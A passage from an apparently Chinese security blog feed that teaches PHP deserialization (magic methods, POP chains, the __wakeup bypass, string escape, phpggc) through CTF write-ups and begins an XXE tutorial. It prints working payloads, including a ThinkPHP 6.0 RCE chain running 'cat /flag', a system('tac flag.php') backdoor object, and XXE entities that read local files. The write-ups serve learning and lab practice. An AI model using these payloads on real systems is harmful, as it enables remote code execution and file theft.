class="hljs-number">2</span>:<span class="hljs-string">&quot;18&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><h1 id="PHP序列化和反序列化"><a href="#PHP序列化和反序列化" class="headerlink" title="PHP序列化和反序列化"></a>PHP序列化和反序列化</h1><p>序列化就是把对象转换为数组或字符串等格式。反序列化就是将数组或字符串等格式转换成对象。</p><p><img src="/../images/Pasted%20image%2020241210181426.png"><br>如何把一个对象序列化成一串字符串？举个例子：</p><p><img src="/../images/Pasted%20image%2020241115174639.png"></p><p>这里首先创建了一个类Demo。在实例化时，改变了其属性。PHP对象是存放在内存的堆空间段上的，PHP文件在执行结束的时候会将对象销毁。那么如果之后还要用到这个实例怎么办？解决方法就是先将它序列化存起来。<strong>序列化只序列属性，不序列方法</strong>。</p><p><img src="/../images/Pasted%20image%2020241115175445.png"></p><p>按顺序解释一下输出结果。<br>O: object；<br>4: 类名的长度；<br>2: 2个属性；<br>s:4 : 第一个属性名，是一个字符串string且长度为4；<br>s:3 : 第一个属性对应的值，是一个字符串string且长度为3；<br>s:3 : 第二个属性名，是一个字符串string且长度为3；<br>s:3 : 第二个属性对应的值，是一个字符串string且长度为3。</p><p>用的时候再将其反序列化。</p><p><img src="/../images/Pasted%20image%2020241115181251.png"></p><p>什么时候需要用到序列化和反序列化？</p><ul><li>对象在进行网络传输（比如远程方法调用 RPC 的时候）之前需要先被序列化，接收到序列化的对象之后需要再进行反序列化；</li><li>将对象存储到文件中的时候需要进行序列化，将对象从文件中读取出来需要进行反序列化；</li><li>将对象存储到缓存数据库（如 Redis）时需要用到序列化，将对象从缓存数据库中读取出来需要反序列化。</li></ul><h1 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h1><figure class="highlight sqf"><table><tr><td class="code"><pre><code class="hljs sqf"><span class="hljs-variable">__construct</span> ():  当对象 new 的时候会自动调用，类似构造函数。<br><br><span class="hljs-variable">__destruct</span> ()：当对象被销毁时会被自动调用，包含主动销毁 (即手动销毁对象) 和被动销毁 (即程序运行结束)，类似析构函数。<br><br><span class="hljs-variable">__sleep</span> ():  执行serialize () 时被自动调用。<br><br><span class="hljs-variable">__wakeup</span> ():  执行unserialize () 时会被自动调用。<br><br><span class="hljs-variable">__invoke</span> ():  当尝试以调用函数的方法调用一个对象时会被自动调用。<br><br><span class="hljs-variable">__toString</span> (): 把类当作字符串使用时触发。<span class="hljs-comment">//echo $a</span><br><br><span class="hljs-variable">__call</span> ():  调用某个方法，若方法存在，则调用；若不存在，则会去调用<span class="hljs-variable">__call</span> 函数。<br><br><span class="hljs-variable">__get</span> ():  读取对象属性时，若存在，则返回属性值；若不存在，则会调用<span class="hljs-variable">__get</span> 函数。<br><br><span class="hljs-variable">__set</span> ():  设置对象的属性时，若属性存在，则赋值；若不存在，则调用<span class="hljs-variable">__set</span> 函数。<br><br><span class="hljs-variable">__isset</span> ():  在不可访问的属性上调用 isset () 或 empty () 触发。<br><br><span class="hljs-variable">__unset</span> ():  在不可访问的属性上使用 unset () 时触发。<br></code></pre></td></tr></table></figure><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>序列化和反序列化本身没有问题，但是如果反序列化内容用户可控，且后台不正当地使用了魔术方法，就会导致安全问题。</p><p>当传给<code>unserialize()</code>的<strong>参数可控</strong>时，可以通过传入一个精心构造的序列化字符串，从而控制对象内部的变量甚至是函数。</p><p>实战中反序列化漏洞一般是工具扫出来的，或者是一些框架&#x2F;组件已经被爆出来存在反序列化漏洞，攻击者发现目标网站使用了该框架或组件。</p><h1 id="POP-链构造"><a href="#POP-链构造" class="headerlink" title="POP 链构造"></a>POP 链构造</h1><p>一般来说，出现 PHP 反序列化漏洞是因为代码中写的魔术方法不安全。因为魔术方法会被自动调用，那我们就可以构造恶意的exp来触发它，但有的时候如果出现漏洞的代码不在魔术方法中，而是只在一个普通方法中，那我们怎么利用呢？这时候就可以通过构造 POP 链寻找相同的函数名将类的属性和敏感函数的属性联系起来。</p><p>POP链构造首先就是要找到头和尾，也就是用户能传入参数的地方（头）和最终要执行函数方法的地方（尾）。找到头尾之后反推过程，从尾部开始一步步找到能触发上一步的地方，直到找到传参处，此时完整的POP链就显而易见了。CTF赛中一般尾部就是get flag的方法，头部则是GET&#x2F;POST传参。</p><p><img src="/../images/Pasted%20image%2020241210183851.png"></p><h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>index.php：<br><img src="/../images/Pasted%20image%2020241115185130.png"><br>class.php：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;nonono&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;yesyes&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-string">&#x27;guest&#x27;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;password != <span class="hljs-number">100</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You name is: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;username;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You password is: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;password;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;username === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;<br>            <span class="hljs-keyword">die</span>();<br>            <br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>分析代码。由于unserialize()结束时会自动调用__destruct()，所以只要满足 username&#x3D;admin 且 password &#x3D;100，即可得到flag。所以要构造一个 username 属性是 admin 且 password 属性是100的 Name 对象。</p><p>注意 username 和 password 都是 private 属性，这意味着它们只能在 Name 类的内部访问，外部代码无法直接修改这些属性。因此，尝试通过 $person-&gt;username 和 $person-&gt;password 访问会导致 PHP Fatal error。</p><p>编写序列化代码时，只需要将原 class 对象复制粘贴下来，要修改的留下，不修改的删掉，如下：</p><p><img src="/../images/Pasted%20image%2020241115191057.png"></p><p>私有属性名称的前面需加上<code>\0</code>。在URL编码中，<code>\0</code>表示为 <code>%00</code>。</p><p>代码中__wakeup()会将username赋值为guest，所以要想办法绕过该函数。</p><blockquote><p>[!NOTE] CVE-2016-7124（__wakeup 绕过）</p><ul><li>影响版本：PHP 5&lt;5.6.25; PHP 7&lt;7.0.10</li><li>漏洞危害：如存在__wakeup 方法，调用 unserilize () 方法前则先调用__wakeup 方法 (即在反序列化恢复对象之前调用该方法)，但序列化字符串中表示对象属性个数的值大于真实属性个数时会跳过__wakeup 执行。</li></ul></blockquote><p>当成员属性数目大于实际数目(O:4)时可以绕过__wakeup()。</p><p>则payload（需要进行url编码）：</p><figure class="highlight perl"><table><tr><td class="code"><pre><code class="hljs perl">?<span class="hljs-keyword">select</span>=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Name&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;<span class="hljs-variable">%0</span>0Name<span class="hljs-variable">%00username</span>&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;<span class="hljs-variable">%0</span>0Name<span class="hljs-variable">%00password</span>&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;100&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><h2 id="CTFSHOW-Web257"><a href="#CTFSHOW-Web257" class="headerlink" title="CTFSHOW-Web257"></a>CTFSHOW-Web257</h2><p><img src="/../images/Pasted%20image%2020241210192918.png"></p><p>构造 backDoor 类对象作为 ctfshowUser 的成员变量，当代码逻辑执行完后，销毁 ctfShowUser 后就会调用到 backDoor.getInfo()方法。</p><figure class="highlight php-template"><table><tr><td class="code"><pre><code class="hljs php-template"><span class="language-xml">// POP链CODE：</span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;backDoor&#x27;</span>;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>=<span class="hljs-title">new</span> <span class="hljs-title">backDoor</span>();</span></span><br><span class="hljs-class"><span class="language-php">    &#125;</span></span><br><span class="hljs-class"><span class="language-php">&#125;</span></span><br><span class="hljs-class"><span class="language-php"><span class="hljs-title">class</span> <span class="hljs-title">backDoor</span></span>&#123;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>=<span class="hljs-string">&#x27;system(&quot;tac flag.php&quot;);&#x27;</span>;</span><br><span class="language-php">    </span><br><span class="language-php">&#125;</span><br><span class="language-php"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> ctfShowUser)); <span class="hljs-comment">//cookie要进行url编码</span></span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><p>序列化后的数据：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;ctfShowUser&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;class&quot;</span>;O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;backDoor&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;code&quot;</span>;s:<span class="hljs-number">23</span>:<span class="hljs-string">&quot;system(&quot;</span>tac flag.php<span class="hljs-string">&quot;);&quot;</span>;&#125;&#125;<br></code></pre></td></tr></table></figure><h1 id="字符串逃逸"><a href="#字符串逃逸" class="headerlink" title="字符串逃逸"></a>字符串逃逸</h1><p><a href="https://www.suyou.world/index.php/2023/12/13/%e7%ac%ac61%e5%a4%a9%ef%bc%9aweb%e6%94%bb%e9%98%b2-php%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e5%8e%9f%e7%94%9f%e7%b1%bbtips%e5%ad%97%e7%ac%a6%e4%b8%b2%e9%80%83%e9%80%b8cve%e7%bb%95%e8%bf%87%e6%bc%8f/">第61天：WEB攻防-PHP反序列化&amp;原生类TIPS&amp;字符串逃逸&amp;CVE绕过漏洞&amp;属性类型特征 – The-Starry-Sky</a></p><p>如果代码中有过滤操作，如将 admin 替换为 hacker：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;user&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;isVIP&quot;</span>;i:<span class="hljs-number">0</span>;&#125;<br><span class="hljs-attribute">O</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;user&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;hacker&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;isVIP&quot;</span>;i:<span class="hljs-number">0</span>;&#125;<br></code></pre></td></tr></table></figure><p>第二个序列化数据在反序列化时 s:5:”hakcer” 只识别前五个字符，而后导致后续反序列化格式出现问题，从而反序列化失败。</p><p>字符串逃逸的意思是让目标被替换后，长度格式仍然正确，使其可以正常被反序列化。在反序列化时，若识别到了正确的序列化数据后，多余的垃圾数据是不影响反序列化结果的。</p><p><img src="/../images/Pasted%20image%2020241210210406.png"></p><p>所以最终在参数 x 处传入数据如下：</p><figure class="highlight css"><table><tr><td class="code"><pre><code class="hljs css">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;user&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">282</span>:<span class="hljs-string">&quot;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;isVIP&quot;</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">1</span>;&#125;&quot;;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;isVIP&quot;</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">1</span>;&#125;<br></code></pre></td></tr></table></figure><p>同理，如果替换后字符变少了，考虑使反序列化时多识别一些原本属于正常序列化数据的字符。宗旨就是使替换前后的长度相同。</p><h1 id="PHP原生类"><a href="#PHP原生类" class="headerlink" title="PHP原生类"></a>PHP原生类</h1><p><a href="https://www.anquanke.com/post/id/264823">浅析PHP原生类-安全客 - 安全资讯平台</a></p><h1 id="框架漏洞利用"><a href="#框架漏洞利用" class="headerlink" title="框架漏洞利用"></a>框架漏洞利用</h1><p>反序列化链项目：<a href="https://github.com/NotSoSecure/SerializedPayloadGenerator">https://github.com/NotSoSecure/SerializedPayloadGenerator</a></p><p>它包含对 YSoSerial（Java）、YSoSerial.Net、PHPGGC 和其他工具的支持。使用 Web 界面，可以为各种框架生成反序列化payload。</p><p>包含如下：</p><ul><li>Java – YSoSerial</li><li>NET – YSoSerial.NET</li><li>PHP – PHPGGC</li><li>Python - 原生</li></ul><p>这里主要介绍 <strong>PHPGGC</strong>： <a href="https://github.com/ambionics/phpggc">https://github.com/ambionics/phpggc</a></p><p>目前该工具支持的框架包括：CodeIgniter4、Doctrine、Drupal7、Guzzle、Laravel、Magento、Monolog、Phalcon、Podio、ThinkPHP、Slim、SwiftMailer、Symfony、Wordpress、Yii 和 ZendFramework 等。</p><h2 id="BUUCTF-安洵杯-2019-iamthinking"><a href="#BUUCTF-安洵杯-2019-iamthinking" class="headerlink" title="BUUCTF [安洵杯 2019] iamthinking"></a>BUUCTF [安洵杯 2019] iamthinking</h2><p><img src="/../images/Pasted%20image%2020241211133638.png"></p><p>dirsearch目录扫描，发现<a href="http://www.zip,下载源码审计.发现网站是用/">www.zip，下载源码审计。发现网站是用</a> ThinkPHP 6.0 开发的。</p><p><img src="/../images/Pasted%20image%2020241211120745.png"></p><p>在 app&#x2F;controller&#x2F;index.php 中发现unserialize关键词。</p><p><img src="/../images/Pasted%20image%2020241211121050.png"></p><p>parse_url 解析当前请求的 URL 并提取其组成部分。将 URL 中的 query 字符串（URL结构见下图） 解析成数组 <code>$query</code>。遍历查询字符串中的参数值，检查值是否以字母 <code>O</code> 开头（忽略大小写）。</p><p><img src="/../images/Pasted%20image%2020241113192136.png"></p><p>O是php对象序列化后的第一个字符，parse_url 解析出来的 url 中 的payload 却不能以O开头，那么如何绕过？</p><p><a href="https://www.cnblogs.com/tr1ple/p/11137159.html">parse_url小结 - tr1ple - 博客园</a></p><blockquote><p>[!NOTE] 解析url</p><ul><li>URL形如<a href="http://xxx.com///index.php?payload=cmd">http://xxx.com///index.php?payload=cmd</a> （path部分为&#x2F;&#x2F;&#x2F;）时，可以正常访问，但parse_url会返回false。</li><li>parse_url：匹配最后一个@后面符合格式的host。</li><li>curl：匹配第一个@后面符合格式的host。</li></ul></blockquote><p>接下来构造 ThinkPHP 6.0 反序列化漏洞的payload。</p><p>使用 phpggc 工具直接搜索 thinkphp，查看是否有符合版本的链可以利用：</p><p><img src="/../images/Pasted%20image%2020241211133041.png"></p><p>选择要使用的链，查看使用语法格式，这里使用 ThinkPHP&#x2F;RCE3，生成要执行的命令：</p><p><img src="/../images/Pasted%20image%2020241211133400.png"></p><p>因此，payload为</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">2508200</span>c-<span class="hljs-number">2</span>a42-<span class="hljs-number">4</span>a62-adb5-e8c33baf78d7.node5.buuoj.cn:<span class="hljs-number">81</span>///public/?payload=O%<span class="hljs-number">3</span>A41%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>League%<span class="hljs-number">5</span>CFlysystem%<span class="hljs-number">5</span>CCached%<span class="hljs-number">5</span>CStorage%<span class="hljs-number">5</span>CPsr6Cache%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A47%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>League%<span class="hljs-number">5</span>CFlysystem%<span class="hljs-number">5</span>CCached%<span class="hljs-number">5</span>CStorage%<span class="hljs-number">5</span>CPsr6Cache%<span class="hljs-number">00</span>pool%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A26%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>League%<span class="hljs-number">5</span>CFlysystem%<span class="hljs-number">5</span>CDirectory%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A13%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>filesystem%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A26%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>League%<span class="hljs-number">5</span>CFlysystem%<span class="hljs-number">5</span>CDirectory%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A13%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>filesystem%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A14%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>think%<span class="hljs-number">5</span>CValidate%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>type%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>key%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A6%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>system%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>path%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A9%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>cat%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>Fflag%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>path%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>key%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A11%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>autosave%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bb%<span class="hljs-number">3</span>A0%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A6%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>key%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bi%<span class="hljs-number">3</span>A0%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A8%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>anything%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241211134215.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;类和对象&quot;&gt;&lt;a href=&quot;#类和对象&quot; class=&quot;headerlink&quot; title=&quot;类和对象&quot;&gt;&lt;/a&gt;类和对象&lt;/h1&gt;&lt;p&gt;在面向对象的程序设计中，&lt;strong&gt;类&lt;/strong&gt;和&lt;strong&gt;对象&lt;/strong&gt;是两个非常重要的概念。类</summary>
      
    
    
    
    
    <category term="WEB" scheme="http://example.com/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>XXE漏洞</title>
    <link href="http://example.com/2024/12/09/XXE%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2024/12/09/XXE%E6%BC%8F%E6%B4%9E/</id>
    <published>2024-12-09T06:56:21.000Z</published>
    <updated>2024-12-10T10:21:46.098Z</updated>
    
    <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>XXE (XML External Entity Injection)，即 XML 外部实体注入漏洞。XXE 漏洞发生在应用程序解析 XML 输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取 ( php 原生态代码)、命令执行（如Java中一些第三方库导致）、内网扫描、攻击内网等危害。</p><p>XML 文档的作用是传输和存储数据，其焦点是数据的内容，把数据从 HTML 分离，是独立于软件和硬件的信息传输工具。等同于 JSON 传输。</p><p>XML文档结构：</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--XML声明--&gt;</span><br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><br><span class="hljs-comment">&lt;!--DTD，这部分可选的--&gt;</span>          <br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [ </span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">foo</span> <span class="hljs-keyword">ANY</span> &gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///c:/windows/win.ini&quot;</span> &gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><br><span class="hljs-comment">&lt;!--文档元素--&gt;</span>                                                                          <br><span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>DTD：Document Type Definition 即文档类型定义，用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在一个文件（.dtd）中(外部引用)。</p><p>DTD实体有以下几种声明方式：</p><ul><li>内部实体：</li></ul><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span> [ </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY a <span class="hljs-string">&quot;admin&quot;</span>&gt;</span> </span><br><span class="hljs-meta">]&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span>&amp;a<span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span> <br><span class="hljs-comment">&lt;!-- admin --&gt;</span><br></code></pre></td></tr></table></figure><ul><li>参数实体：</li></ul><figure class="highlight mojolicious"><table><tr><td class="code"><pre><code class="hljs mojolicious"><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span>&gt;</span> [</span><br><span class="language-xml">    <span class="hljs-meta">&lt;!ENTITY % b <span class="hljs-string">&quot;&lt;!ENTITY b1 &quot;</span>awsl<span class="hljs-string">&quot;&gt;&quot;</span>&gt;</span></span><br><span class="language-xml"></span><span class="language-perl">    <span class="hljs-variable">%b</span>;</span><span class="language-xml"></span><br><span class="language-xml">]&gt;</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span>&amp;b1<span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-comment">&lt;!-- awsl --&gt;</span></span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] </p><ul><li>参数实体用<code>% name</code>申明，引用时用<code>%name;</code>，只能在DTD中申明，DTD中引用。</li><li>其余实体直接用<code>name</code>申明，引用时用<code>&amp;name;</code>，只能在DTD中申明，可在xml文档中引用</li></ul></blockquote><ul><li>外部实体：</li></ul><p>外部引用可支持http，file等协议。</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span>&gt;</span> [ <br><span class="hljs-meta">&lt;!ENTITY c <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>&gt;</span> <br>]&gt; <br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span>&amp;c<span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span> <br><span class="hljs-comment">&lt;!-- Y2w0eV9uZWVkX2FfZ3JpbGZyaWVuZA== --&gt;</span><br></code></pre></td></tr></table></figure><ul><li>外部参数实体：</li></ul><figure 